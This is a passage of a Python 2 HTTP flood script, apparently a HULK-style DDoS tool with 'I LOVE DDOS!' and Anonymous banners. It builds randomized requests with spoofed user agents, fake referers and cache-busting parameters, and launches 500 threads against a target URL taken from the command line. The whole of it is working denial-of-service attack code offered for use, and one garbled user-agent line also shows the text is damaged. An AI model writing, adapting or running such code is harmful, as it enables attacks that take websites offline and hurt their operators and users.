	headers_useragents.append('CCBot/1.0 (+http://www.commoncrawl.org/bot.html)')

	headers_useragents.append('ccubee/x.x')

	headers_useragents.append('CDR/1.7.1 Simulator/0.7(+http://timewe.net) Profile/MIDP-1.0 Configuration/CLDC-1.0')

	headers_useragents.append('CE-Preload')

	headers_useragents.append('CentiverseBot')

	headers_useragents.append('CentiverseBot - investigator')

	headers_useragents.append('CentiverseBot/3.0 (http://www.centiverse-project.net)')

	headers_useragents.append('Ceramic Tile Installation Guide (http://www.floorstransformed.com)')

	headers_useragents.append('CERN-LineMode/2.15')

	headers_useragents.append('cfetch/1.0')

	headers_useragents.append('CFNetwork/x.x')

	headers_useragents.append('cg-eye interactive')

	headers_useragents.append('Charon/1.x (Amiga)')

	headers_useragents.append('Chat Catcher/1.0')

	headers_useragents.append('Checkbot/1.xx LWP/5.xx')

	headers_useragents.append('CheckLinks/1.x.x')

	headers_useragents.append('CheckUrl')

	headers_useragents.append('CheckWeb')

	headers_useragents.append('Chilkat/1.0.0 (+http://www.chilkatsoft.com/ChilkatHttpUA.asp)')

	headers_useragents.append('China Local Browse 2.6')

	headers_useragents.append('Chitika ContentHit 1.0')

	headers_useragents.append('ChristCRAWLER 2.0')

	headers_useragents.append('CHttpClient by Open Text Corporation')

	headers_useragents.append('CipinetBot (http://www.cipinet.com/bot.html)')

	headers_useragents.append('Cityreview Robot (+http://www.cityreview.org/crawler/)')

	headers_useragents.append('CJ Spider/')

	headers_useragents.append('CJB.NET Proxy')

	headers_useragents.append('ClariaBot/1.0')

	headers_useragents.append('Claymont.com')

	headers_useragents.append('CloakDetect/0.9 (+http://fulltext.seznam.cz/)')

	headers_useragents.append('Clushbot/2.x (+http://www.clush.com/bot.html)')

	headers_useragents.append('Clushbot/3.x-BinaryFury (+http://www.clush.com/bot.html)')

	headers_useragents.append('Clushbot/3.xx-Ajax (+http://www.clush.com/bot.html)')

	headers_useragents.append('Clushbot/3.xx-Hector (+http://www.clush.com/bot.html)')

	headers_useragents.append('Clushbot/3.xx-Peleus (+http://www.clush.com/bot.html)')

	headers_useragents.append('COAST WebMaster Pro/4.x.x.xx (Windows NT)')

	headers_useragents.append('CoBITSProbe')

	headers_useragents.append('Cocoal.icio.us/1.0 (v36) (Mac OS X; http://www.scifihifi.com/cocoalicious)')

	headers_useragents.append('Cogentbot/1.X (+http://www.cogentsoftwaresolutions.com/bot.html)')

	headers_useragents.append('ColdFusion')

	headers_useragents.append('ColdFusion (BookmarkTracker.com)')

	headers_useragents.append('collage.cgi/1.xx')

	headers_useragents.append('combine/0.0')

	headers_useragents.append('Combine/2.0 http://combine.it.lth.se/')

	headers_useragents.append('Combine/3 http://combine.it.lth.se/')

	headers_useragents.append('Combine/x.0')

	headers_useragents.append('cometrics-bot) http://www.cometrics.de')

	headers_useragents.append('Commerce Browser Center')

	headers_useragents.append('complex_network_group/Nutch-0.9-dev (discovering the structure of the world-wide-web; http://cantor.ee.ucla.edu/~networks/crawl; nimakhaj@gmail.com)')

	headers_useragents.append('Computer_and_Automation_Research_Institute_Crawler crawler@ilab.sztaki.hu')

	headers_useragents.append('Comrite/0.7.1 (Nutch; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)')

	headers_useragents.append('Contact')

	headers_useragents.append('ContactBot/0.2')

	headers_useragents.append('ContentSmartz')

	headers_useragents.append('contype')

	headers_useragents.append('Convera Internet Spider V6.x')

	headers_useragents.append('ConveraCrawler/0.2')

	headers_useragents.append('ConveraCrawler/0.9d (+http://www.authoritativeweb.com/crawl)')

	headers_useragents.append('ConveraMultiMediaCrawler/0.1 (+http://www.authoritativeweb.com/crawl)')

	headers_useragents.append('CoolBot')

	headers_useragents.append('Cooliris/1.5 CFNetwork/459 Darwin/10.0.0d3')

	headers_useragents.append('CoralWebPrx/0.1.1x (See http://coralcdn.org/)') 

	headers_useragents.append('cosmos/0.8_(robot@xyleme.com)')

	headers_useragents.append('cosmos/0.9_(robot@xyleme.com)')

	headers_useragents.append('CoteoNutchCrawler/Nutch-0.9 (info [at] coteo [dot] com)')

	headers_useragents.append('CougarSearch/0.x (+http://www.cougarsearch.com/faq.shtml)')

	headers_useragents.append('Covac TexAs Arachbot')

	headers_useragents.append('CoverScout%203/3.0.1 CFNetwork/339.5 Darwin/9.5.0 (i386) (iMac5)1)')

	headers_useragents.append('Cowbot-0.1 (NHN Corp. / +82-2-3011-1954 / nhnbot@naver.com)')

	headers_useragents.append('Cowbot-0.1.x (NHN Corp. / +82-2-3011-1954 / nhnbot@naver.com)')

	headers_useragents.append('CrawlConvera0.1 (CrawlConvera@yahoo.com)')

	headers_useragents.append('Crawler')

	headers_useragents.append('Crawler (cometsearch@cometsystems.com)')

	headers_useragents.append('Crawler admin@crawler.de')

	headers_useragents.append('Crawler V 0.2.x admin@crawler.de')

	headers_useragents.append('crawler@alexa.com')

	headers_useragents.append('CrawlerBoy Pinpoint.com')

	headers_useragents.append('Crawllybot/0.1 (Crawllybot; +http://www.crawlly.com; crawler@crawlly.com)')

	headers_useragents.append('CreativeCommons/0.06-dev (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@lists.sourceforge.net)')

	headers_useragents.append('Cricket-A100/1.0 UP.Browser/6.3.0.7 (GUI) MMP/2.0')

	headers_useragents.append('CrocCrawler vx.3 [en] (http://www.croccrawler.com) (X11; I; Linux 2.0.44 i686)')

	headers_useragents.append('csci_b659/0.13')

	headers_useragents.append('CSE HTML Validator Professional (http://www.htmlvalidator.com/)')

	headers_useragents.append('Cuam Ver0.050bx')

	headers_useragents.append('Cuasarbot/0.9b http://www.cuasar.com/spider_beta/')

	headers_useragents.append('curl/7.10.x (i386-redhat-linux-gnu) libcurl/7.10.x OpenSSL/0.9.7a ipv6 zlib/1.1.4')

	headers_useragents.append('curl/7.7.x (i386--freebsd4.3) libcurl 7.7.x (SSL 0.9.6) (ipv6 enabled)')

	headers_useragents.append('curl/7.8 (i686-pc-linux-gnu) libcurl 7.8 (OpenSSL 0.9.6)')

	headers_useragents.append('curl/7.9.x (win32) libcurl 7.9.x')

	headers_useragents.append('CurryGuide SiteScan 1.1')

	headers_useragents.append('Custo x.x (www.netwu.com)')

	headers_useragents.append('Custom Spider www.bisnisseek.com /1.0')

	headers_useragents.append('Cyberdog/2.0 (Macintosh; 68k)')

	headers_useragents.append('CyberPatrol SiteCat Webbot')

	headers_useragents.append('CyberSpyder Link Test/2.1.12')

	headers_useragents.append('CydralSpider/1.x')

	headers_useragents.append('CydralSpider/3.0')

	headers_useragents.append('DA 3.5')

	headers_useragents.append('DA 4.0')

	headers_useragents.append('DA 4.0')

	headers_useragents.append('DA 5.0')

	headers_useragents.append('DA 7.0')

	headers_useragents.append('DAP x.x')

	headers_useragents.append('Dart Communications PowerTCP')

	headers_useragents.append('DataCha0s/2.0')

	headers_useragents.append('DataCha0s/2.0')

	headers_useragents.append('DataFountains/DMOZ Downloader')

	headers_useragents.append('DataFountains/Dmoz Downloader (http://ivia.ucr.edu/useragents.shtml)')

	headers_useragents.append('DataFountains/DMOZ Feature Vector Corpus Creator (http://ivia.ucr.edu/useragents.shtml)')

	headers_useragents.append('DataparkSearch/4.47 (+http://dataparksearch.org/bot)')

	headers_useragents.append('DataparkSearch/4.xx (http://www.dataparksearch.org/)')

	headers_useragents.append('DataSpear/1.0 (Spider; http://www.dataspear.com/spider.html; spider@dataspear.com)')

	headers_useragents.append('DataSpearSpiderBot/0.2 (DataSpear Spider Bot; http://dssb.dataspear.com/bot.html; dssb@dataspear.com)')

	headers_useragents.append('DatenBot( http://www.sicher-durchs-netz.de/bot.html)')

	headers_useragents.append('DaviesBot/1.7')

	headers_useragents.append('daypopbot/0.x')

	headers_useragents.append('dbDig(http://www.prairielandconsulting.com)')

	headers_useragents.append('DBrowse 1.4b')

	headers_useragents.append('DBrowse 1.4d')

	headers_useragents.append('DC-Sakura/x.xx')

	headers_useragents.append('dCSbot/1.1')

	headers_useragents.append('DDD')

	headers_useragents.append('dds explorer v1.0 beta')

	headers_useragents.append('de.searchengine.comBot 1.2 (http://de.searchengine.com/spider)')

	headers_useragents.append('DeadLinkCheck/0.4.0 libwww-perl/5.xx')

	headers_useragents.append('Deep Link Calculator v1.0')

	headers_useragents.append('deepak-USC/ISI')

	headers_useragents.append('DeepIndex')

	headers_useragents.append('DeepIndex ( http://www.zetbot.com )')

	headers_useragents.append('DeepIndex (www.en.deepindex.com)')

	headers_useragents.append('DeepIndexer.ca')

	headers_useragents.append('del.icio.us-thumbnails/1.0 Mozilla/5.0 (compatible; Konqueror/3.4; FreeBSD) KHTML/3.4.2 (like Gecko)')

	headers_useragents.append('DeleGate/9.0.5-fix1')

	headers_useragents.append('Demo Bot DOT 16b')

	headers_useragents.append('Demo Bot Z 16b')

	headers_useragents.append('Denmex websearch (http://search.denmex.com)')

	headers_useragents.append('dev-spider2.searchpsider.com/1.3b')

	headers_useragents.append('DevComponents.com HtmlDocument Object')

	headers_useragents.append('DiaGem/1.1 (http://www.skyrocket.gr.jp/diagem.html)')

	headers_useragents.append('Diamond/x.0')

	headers_useragents.append('DiamondBot')

	headers_useragents.append('Digger/1.0 JDK/1.3.0rc3')

	headers_useragents.append('DigOut4U')

	headers_useragents.append('DIIbot/1.2')

	headers_useragents.append('Dillo/0.8.5-i18n-misc')

	headers_useragents.append('Dillo/0.x.x')

	headers_useragents.append('disastrous/1.0.5 (running with Python 2.5.1; http://www.bortzmeyer.org/disastrous.html; archangel77@del.icio.us)')

	headers_useragents.append('DISCo Pump x.x')

	headers_useragents.append('disco/Nutch-0.9 (experimental crawler; www.discoveryengine.com; disco-crawl@discoveryengine.com)')

	headers_useragents.append('disco/Nutch-1.0-dev (experimental crawler; www.discoveryengine.com; disco-crawl@discoveryengine.com)')

	headers_useragents.append('DittoSpyder')

	headers_useragents.append('dloader(NaverRobot)/1.0')

	headers_useragents.append('DNSRight.com WebBot Link Ckeck Tool. Report abuse to: dnsr@dnsright.com')

	headers_useragents.append('DoCoMo/1.0/Nxxxi/c10')

	headers_useragents.append('DoCoMo/1.0/Nxxxi/c10/TB')

	headers_useragents.append('DoCoMo/1.0/P502i/c10 (Google CHTML Proxy/1.0)')

	headers_useragents.append('DoCoMo/2.0 P900iV(c100;TB;W24H11)')

	headers_useragents.append('DoCoMo/2.0 SH901iS(c100;TB;W24H12))gzip(gfe) (via translate.google.com)')

	headers_useragents.append('DoCoMo/2.0 SH902i (compatible; Y!J-SRD/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)')

	headers_useragents.append('DoCoMo/2.0/SO502i (compatible; Y!J-SRD/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)')

	headers_useragents.append('DocZilla/1.0 (Windows; U; WinNT4.0; en-US; rv:1.0.0) Gecko/20020804')

	headers_useragents.append('dodgebot/experimental')

	headers_useragents.append('DonutP; Windows98SE')

	headers_useragents.append('Doubanbot/1.0 (bot@douban.com http://www.douban.com)')

	headers_useragents.append('Download Demon/3.x.x.x')

	headers_useragents.append('Download Druid 2.x')

	headers_useragents.append('Download Express 1.0')

	headers_useragents.append('Download Master')

	headers_useragents.append('Download Ninja 3.0')

	headers_useragents.append('Download Wonder')

	headers_useragents.append('Download-Tipp Linkcheck (http://download-tipp.de/)')

	headers_useragents.append('Download.exe(1.1) (+http://www.sql-und-xml.de/freeware-tools/)')

	headers_useragents.append('DownloadDirect.1.0')

	headers_useragents.append('Dr.Web (R) online scanner: http://online.drweb.com/')

	headers_useragents.append('Dragonfly File Reader')

	headers_useragents.append('Drecombot/1.0 (http://career.drecom.jp/bot.html)')

	headers_useragents.append('Drupal (+http://drupal.org/)')

	headers_useragents.append('DSurf15a 01')

	headers_useragents.append('DSurf15a 71')

	headers_useragents.append('DSurf15a 81')

	headers_useragents.append('DSurf15a VA')

	headers_useragents.append('DTAAgent')

	headers_useragents.append('dtSearchSpider')

	headers_useragents.append('Dual Proxy')

	headers_useragents.append('DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)')

	headers_useragents.append('Dumbot(version 0.1 beta - dumbfind.com)')

	headers_useragents.append('Dumbot(version 0.1 beta - http://www.dumbfind.com/dumbot.html)')

	headers_useragents.append('Dumbot(version 0.1 beta)')

	headers_useragents.append('e-sense 1.0 ea(www.vigiltech.com/esensedisclaim.html)')

	headers_useragents.append('e-SocietyRobot(http://www.yama.info.waseda.ac.jp/~yamana/es/)')

	headers_useragents.append('eApolloBot/2.0 (compatible; heritrix/2.0.0-SNAPSHOT-20071024.170148 +http://www.eapollo-opto.com)')

	headers_useragents.append('EARTHCOM.info/1.x [www.earthcom.info]')

	headers_useragents.append('EARTHCOM.info/1.xbeta [www.earthcom.info]')

	headers_useragents.append('EasyDL/3.xx')

	headers_useragents.append('EasyDL/3.xx http://keywen.com/Encyclopedia/Bot')

	headers_useragents.append('EBrowse 1.4b')

	headers_useragents.append('eCatch/3.0')

	headers_useragents.append('EchO!/2.0')

	headers_useragents.append('Educate Search VxB')

	headers_useragents.append('egothor/3.0a (+http://www.xdefine.org/robot.html)')

	headers_useragents.append('EgotoBot/4.8 (+http://www.egoto.com/about.htm)')

	headers_useragents.append('ejupiter.com')

	headers_useragents.append('EldoS TimelyWeb/3.x')

	headers_useragents.append('elfbot/1.0 (+http://www.uchoose.de/crawler/elfbot/)')

	headers_useragents.append('ELI/20070402:2.0 (DAUM RSS Robot) Daum Communications Corp.; +http://ws.daum.net/aboutkr.html)')

	headers_useragents.append('ELinks (0.x.x; Linux 2.4.20 i586; 132x60)')

	headers_useragents.append('ELinks/0.x.x (textmode; NetBSD 1.6.2 sparc; 132x43)')

	headers_useragents.append('EmailSiphon')

	headers_useragents.append('EmailSpider')

	headers_useragents.append('EmailWolf 1.00')

	headers_useragents.append('EmeraldShield.com WebBot')

	headers_useragents.append('EmeraldShield.com WebBot (http://www.emeraldshield.com/webbot.aspx)')

	headers_useragents.append('EMPAS_ROBOT')

	headers_useragents.append('EnaBot/1.x (http://www.enaball.com/crawler.html)')

	headers_useragents.append('endo/1.0 (Mac OS X; ppc i386; http://kula.jp/endo)')

	headers_useragents.append('Enfish Tracker')

	headers_useragents.append('Enterprise_Search/1.0')

	headers_useragents.append('Enterprise_Search/1.0.xxx')

	headers_useragents.append('Enterprise_Search/1.00.xxx;MSSQL (http://www.innerprise.net/es-spider.asp)')

	headers_useragents.append('envolk/1.7 (+http://www.envolk.com/envolkspiderinfo.php)')

	headers_useragents.append('envolk[ITS]spider/1.6(+http://www.envolk.com/envolkspider.html)')

	headers_useragents.append('EroCrawler')

	headers_useragents.append('ES.NET_Crawler/2.0 (http://search.innerprise.net/)')

	headers_useragents.append('eseek-larbin_2.6.2 (crawler@exactseek.com)')

	headers_useragents.append('ESISmartSpider')

	headers_useragents.append('eStyleSearch 4 (compatible; MSIE 6.0; Windows NT 5.0)')

	headers_useragents.append('ESurf15a 15')

	headers_useragents.append('EuripBot/0.x (+http://www.eurip.com) GetFile')

	headers_useragents.append('EuripBot/0.x (+http://www.eurip.com) GetRobots')

	headers_useragents.append('EuripBot/0.x (+http://www.eurip.com) PreCheck')

	headers_useragents.append('Eurobot/1.0 (http://www.ayell.eu)')

	headers_useragents.append('EvaalSE - bot@evaal.com')

	headers_useragents.append('eventax/1.3 (eventax; http://www.eventax.de/; info@eventax.de)')

	headers_useragents.append('Everest-Vulcan Inc./0.1 (R&D project; host=e-1-24; http://everest.vulcan.com/crawlerhelp)')

	headers_useragents.append('Everest-Vulcan Inc./0.1 (R&D project; http://everest.vulcan.com/crawlerhelp)')

	headers_useragents.append('Exabot-Images/1.0')

	headers_useragents.append('Exabot-Test/1.0')

	headers_useragents.append('Exabot/2.0')

	headers_useragents.append('Exabot/3.0')

	headers_useragents.append('ExactSearch')

	headers_useragents.append('ExactSeek Crawler/0.1')

	headers_useragents.append('exactseek-crawler-2.63 (crawler@exactseek.com)')

	headers_useragents.append('exactseek-pagereaper-2.63 (crawler@exactseek.com)')

	headers_useragents.append('exactseek.com')

	headers_useragents.append('Exalead NG/MimeLive Client (convert/http/0.120)')

	headers_useragents.append('Excalibur Internet Spider V6.5.4')

	headers_useragents.append('Execrawl/1.0 (Execrawl; http://www.execrawl.com/; bot@execrawl.com)')

	headers_useragents.append('exooba crawler/exooba crawler (crawler for exooba.com; http://www.exooba.com/; info at exooba dot com)')

	headers_useragents.append('exooba/exooba crawler (exooba; exooba)')

	headers_useragents.append('ExperimentalHenrytheMiragoRobot')

	headers_useragents.append('Expired Domain Sleuth')

	headers_useragents.append('Express WebPictures (www.express-soft.com)')

	headers_useragents.append('ExtractorPro')

	headers_useragents.append('Extreme Picture Finder')

	headers_useragents.append('EyeCatcher (Download-tipp.de)/1.0')

	headers_useragents.append('Factbot 1.09 (see http://www.factbites.com/webmasters.php)')

	headers_useragents.append('factbot : http://www.factbites.com/robots')

	headers_useragents.append('FaEdit/2.0.x')

	headers_useragents.append('FairAd Client')

	headers_useragents.append('FANGCrawl/0.01')

	headers_useragents.append('FARK.com link verifier')

	headers_useragents.append('Fast Crawler Gold Edition')

	headers_useragents.append('FAST Enterprise Crawler 6 (Experimental)')

	headers_useragents.append('FAST Enterprise Crawler 6 / Scirus scirus-crawler@fast.no; http://www.scirus.com/srsapp/contactus/')

	headers_useragents.append('FAST Enterprise Crawler 6 used by Cobra Development (admin@fastsearch.com)')

	headers_useragents.append('FAST Enterprise Crawler 6 used by Comperio AS (sts@comperio.no)')

	headers_useragents.append('FAST Enterprise Crawler 6 used by FAST (FAST)')

	headers_useragents.append('FAST Enterprise Crawler 6 used by Pages Jaunes (pvincent@pagesjaunes.fr)')

	headers_useragents.append('FAST Enterprise Crawler 6 used by Sensis.com.au Web Crawler (search_comments\at\sensis\dot\com\dot\au)')

	headers_useragents.append('FAST Enterprise Crawler 6 used by Singapore Press Holdings (crawler@sphsearch.sg)')

	headers_useragents.append('FAST Enterprise Crawler 6 used by WWU (wardi@uni-muenster.de)')

	headers_useragents.append('FAST Enterprise Crawler/6 (www.fastsearch.com)')

	headers_useragents.append('FAST Enterprise Crawler/6.4 (helpdesk at fast.no)')

	headers_useragents.append('FAST FirstPage retriever (compatible; MSIE 5.5; Mozilla/4.0)')

	headers_useragents.append('FAST MetaWeb Crawler (helpdesk at fastsearch dot com)')

	headers_useragents.append('Fast PartnerSite Crawler')

	headers_useragents.append('FAST-WebCrawler/2.2.10 (Multimedia Search) (crawler@fast.no; http://www.fast.no/faq/faqfastwebsearch/faqfastwebcrawler.html)')

	headers_useragents.append('FAST-WebCrawler/2.2.6 (crawler@fast.no; http://www.fast.no/faq/faqfastwebsearch/faqfastwebcrawler.html)')

	headers_useragents.append('FAST-WebCrawler/2.2.7 (crawler@fast.no; http://www.fast.no/faq/faqfastwebsearch/faqfastwebcrawler.html)http://www.fast.no')

	headers_useragents.append('FAST-WebCrawler/2.2.8 (crawler@fast.no; http://www.fast.no/faq/faqfastwebsearch/faqfastwebcrawler.html)http://www.fast.no')

	headers_useragents.append('FAST-WebCrawler/3.2 test')

	headers_useragents.append('FAST-WebCrawler/3.3 (crawler@fast.no; http://fast.no/support.php?c=faqs/crawler)')

	headers_useragents.append('FAST-WebCrawler/3.4/Nirvana (crawler@fast.no; http://fast.no/support.php?c=faqs/crawler)')

	headers_useragents.append('FAST-WebCrawler/3.4/PartnerSite (crawler@fast.no; http://fast.no/support.php?c=faqs/crawler)')

	headers_useragents.append('FAST-WebCrawler/3.5 (atw-crawler at fast dot no; http://fast.no/support.php?c=faqs/crawler)')

	headers_useragents.append('FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)')

	headers_useragents.append('FAST-WebCrawler/3.6/FirstPage (crawler@fast.no; http://fast.no/support.php?c=faqs/crawler)')

	headers_useragents.append('FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)')

	headers_useragents.append('FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)')

	headers_useragents.append('FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)')

	headers_useragents.append('FAST-WebCrawler/3.8/Fresh (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)')

	headers_useragents.append('FAST-WebCrawler/3.x Multimedia')

	headers_useragents.append('FAST-WebCrawler/3.x Multimedia (mm dash crawler at fast dot no)')

	headers_useragents.append('fastbot crawler beta 2.0 (+http://www.fastbot.de)')

	headers_useragents.append('FastBug http://www.ay-up.com')

	headers_useragents.append('FastCrawler 3.0.1 (crawler@1klik.dk)')

	headers_useragents.append('FastSearch Web Crawler for Verizon SuperPages (kevin.watters@fastsearch.com)')

	headers_useragents.append('Favcollector/2.0 (info@favcollector.com http://www.favcollector.com/)')

	headers_useragents.append('FavIconizer')

	headers_useragents.append('favo.eu crawler/0.6 (http://www.favo.eu)')

	headers_useragents.append('FavOrg')

	headers_useragents.append('Favorites Checking (http://campulka.net)')

	headers_useragents.append('Favorites Sweeper v.2.03')

	headers_useragents.append('Faxobot/1.0')

	headers_useragents.append('FDM 1.x')

	headers_useragents.append('FDM 2.x')

	headers_useragents.append('Feed Seeker Bot (RSS Feed Seeker http://www.MyNewFavoriteThing.com/fsb.php)')

	headers_useragents.append('Feed24.com')

	headers_useragents.append('Feed::Find/0.0x')

	headers_useragents.append('Feedable/0.1 (compatible; MSIE 6.0; Windows NT 5.1)')

	headers_useragents.append('FeedChecker/0.01')

	headers_useragents.append('FeedDemon/2.7 (http://www.newsgator.com/; Microsoft Windows XP)')

	headers_useragents.append('Feedfetcher-Google-iGoogleGadgets; (+http://www.google.com/feedfetcher.html)')

	headers_useragents.append('Feedfetcher-Google; (+http://www.google.com/feedfetcher.html)')

	headers_useragents.append('FeedForAll rss2html.php v2')

	headers_useragents.append('FeedHub FeedDiscovery/1.0 (http://www.feedhub.com)')

	headers_useragents.append('FeedHub MetaDataFetcher/1.0 (http://www.feedhub.com)')

	headers_useragents.append('Feedjit Favicon Crawler 1.0')

	headers_useragents.append('Feedreader 3.xx (Powered by Newsbrain)')

	headers_useragents.append('Feedshow/x.0 (http://www.feedshow.com; 1 subscriber)')

	headers_useragents.append('FeedshowOnline (http://www.feedshow.com)')

	headers_useragents.append('FeedZcollector v1.x (Platinum) http://www.feeds4all.com/feedzcollector')

	headers_useragents.append('Felix - Mixcat Crawler (+http://mixcat.com)')

	headers_useragents.append('fetch libfetch/2.0')

	headers_useragents.append('FFC Trap Door Spider')

	headers_useragents.append('Filangy/0.01-beta (Filangy; http://www.nutch.org/docs/en/bot.html; filangy-agent@filangy.com)')

	headers_useragents.append('Filangy/1.0x (Filangy; http://www.filangy.com/filangyinfo.jsp?inc=robots.jsp; filangy-agent@filangy.com)')

	headers_useragents.append('Filangy/1.0x (Filangy; http://www.nutch.org/docs/en/bot.html; filangy-agent@filangy.com)')

	headers_useragents.append('fileboost.net/1.0 (+http://www.fileboost.net)')

	headers_useragents.append('FileHound x.x')

	headers_useragents.append('Filtrbox/1.0')

	headers_useragents.append('FindAnISP.com_ISP_Finder_v99a')

	headers_useragents.append('Findexa Crawler (http://www.findexa.no/gulesider/article26548.ece)')

	headers_useragents.append('findlinks/x.xxx (+http://wortschatz.uni-leipzig.de/findlinks/)')

	headers_useragents.append('FineBot')

	headers_useragents.append('Finjan-prefetch')

	headers_useragents.append('Firefly/1.0')

	headers_useragents.append('Firefly/1.0 (compatible; Mozilla 4.0; MSIE 5.5)')

	headers_useragents.append('Firefox (kastaneta03@hotmail.com)')

	headers_useragents.append('Firefox_1.0.6 (kasparek@naparek.cz)')

	headers_useragents.append('FirstGov.gov Search - POC:firstgov.webmasters@gsa.gov')

	headers_useragents.append('firstsbot')

	headers_useragents.append('Flapbot/0.7.2 (Flaptor Crawler; http://www.flaptor.com; crawler at flaptor period com)')

	headers_useragents.append('FlashGet')

	headers_useragents.append('FLATARTS_FAVICO')

	headers_useragents.append('Flexum spider')

	headers_useragents.append('Flexum/2.0')

	headers_useragents.append('FlickBot 2.0 RPT-HTTPClient/0.3-3')

	headers_useragents.append('flunky')

	headers_useragents.append('fly/6.01 libwww/4.0D')

	headers_useragents.append('flyindex.net 1.0/http://www.flyindex.net')

	headers_useragents.append('FnooleBot/2.5.2 (+http://www.fnoole.com/addurl.html)')

	headers_useragents.append('FocusedSampler/1.0')

	headers_useragents.append('Folkd.com Spider/0.1 beta 1 (www.folkd.com)')

	headers_useragents.append('FollowSite Bot ( http://www.followsite.com/bot.html )')

	headers_useragents.append('FollowSite.com ( http://www.followsite.com/b.html )')

	headers_useragents.append('Fooky.com/ScorpionBot/ScoutOut; http://www.fooky.com/scorpionbots')

	headers_useragents.append('Francis/1.0 (francis@neomo.de http://www.neomo.de/)')

	headers_useragents.append('Franklin Locator 1.8')

	headers_useragents.append('free-downloads.net download-link validator /0.1')

	headers_useragents.append('FreeFind.com-SiteSearchEngine/1.0 (http://freefind.com; spiderinfo@freefind.com)')

	headers_useragents.append('Frelicbot/1.0 +http://www.frelic.com/')

	headers_useragents.append('FreshDownload/x.xx')

	headers_useragents.append('FreshNotes crawler< report problems to crawler-at-freshnotes-dot-com')

	headers_useragents.append('FSurf15a 01')

	headers_useragents.append('FTB-Bot http://www.findthebest.co.uk/')

	headers_useragents.append('Full Web Bot 0416B')

	headers_useragents.append('Full Web Bot 0516B')

	headers_useragents.append('Full Web Bot 2816B')

	headers_useragents.append('FuseBulb.Com')

	headers_useragents.append('FyberSpider (+http://www.fybersearch.com/fyberspider.php)')

	headers_useragents.append('unknownght.com Web Server IIS vs Apache Survey. See Results at www.DNSRight.com	headers_useragents.append(')

	return(headers_useragents)

# generates a referer array

def referer_list():

	global headers_referers

	headers_referers.append('http://www.google.com/?q=')

	headers_referers.append('http://www.usatoday.com/search/results?q=')

	headers_referers.append('http://engadget.search.aol.com/search?q=')

	headers_referers.append('http://' + host + '/')

	return(headers_referers)

	

#builds random ascii string

def buildblock(size):

	out_str = ''

	for i in range(0, size):

		a = random.randint(65, 90)

		out_str += chr(a)

	return(out_str)

def usage():

	print 'DeepFuck =Url='

	print "\a"

print \

"""                        .

             ,----------------,              ,---------,

        ,-----------------------,          ,"        ,"|

      ,"                      ,"|        ,"        ,"  |

     +-----------------------+  |      ,"        ,"    |

     |  .-----------------.  |  |     +---------+      |

     |  |                 |  |  |     | -==----'|      |

     |  |  I LOVE DDOS!   |  |  |     |         |      |

     |  |  Bad command or |  |  |/----|`---=    |      |

     |  |  C:\>_0xAbbarhSF |  |  |   ,/|==== ooo |      ;

     |  |                 |  |  |  // |(((( [33]|    ,"

     |  `-----------------'  |," .;'| |((((     |  ,"

     +-----------------------+  ;;  | |         |,"

        /_)______________(_/  //'   | +---------+

   ___________________________/___  `,

  /  oooooooooooooooo  .o.  oooo /,   \,"-----------

 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"

/_==__==========__==_ooo__ooo=_/'   /___________,"

This is 0xAbbarhSF: Signed a Death Warrant!

"""

print '---------------------------------------------------'

	

#http request

def httpcall(url):

	useragent_list()

	referer_list()

	code=0

	if url.count("?")>0:

		param_joiner="&"

	else:

		param_joiner="?"

	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))

	request.add_header('User-Agent', random.choice(headers_useragents))

	request.add_header('Cache-Control', 'no-cache')

	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')

	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))

	request.add_header('Keep-Alive', random.randint(110,120))

	request.add_header('Connection', 'keep-alive')

	request.add_header('Host',host)

	try:

			urllib2.urlopen(request)

	except urllib2.HTTPError, e:

			#print e.code

			set_flag(1)

 			print '[+] ~> We are Anonymous - ExpectUS  <~ [+]'

			code=500

	except urllib2.URLError, e:

			#print e.reason

			sys.exit()

	else:

			inc_counter()

			urllib2.urlopen(request)

	return(code)		

	

#http caller thread 

class HTTPThread(threading.Thread):

	def run(self):

		try:

			while flag<2:

				code=httpcall(url)

				if (code==500) & (safe==1):

					set_flag(2)

		except Exception, ex:

			pass

# monitors http threads and counts requests

class MonitorThread(threading.Thread):

	def run(self):

		previous=request_counter

		while flag==0:

			if (previous+100<request_counter) & (previous<>request_counter):

				print "%d (= Starting the Attack =}" % (request_counter)

				previous=request_counter

		if flag==2:

			print "\n -fall and not get up"

#execute 

if len(sys.argv) < 2:

	usage()

	sys.exit()

else:

	if sys.argv[1]=="help":

		usage()

		sys.exit()

	else:

		print "Copyright: Anonymous"

		if len(sys.argv)== 3:

			if sys.argv[2]=="safe":

				set_safe()

		url = sys.argv[1]

		if url.count("/")==2:

			url = url + "/"

		m = re.search('http\://([^/]*)/?.*', url)

		host = m.group(1)

		for i in range(500):

			t = HTTPThread()

			t.start()

		t = MonitorThread()

		t.start()
